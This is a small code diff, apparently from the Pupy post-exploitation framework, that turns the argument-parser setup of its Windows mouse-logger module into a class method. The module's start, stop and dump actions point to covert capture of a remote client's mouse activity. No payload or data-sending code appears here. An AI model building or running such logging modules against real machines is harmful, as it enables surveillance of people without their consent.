@@ -22,9 +22,10 @@ class MouseLoggerModule(PupyModule):
     unique_instance = True
     dependencies = [ 'pupwinutils.mouselogger' ]
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='mouselogger', description=self.__doc__)
-        self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='mouselogger', description=cls.__doc__)
+        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
 
     def run(self, args):
         mouselogger = self.client.conn.modules['pupwinutils.mouselogger']
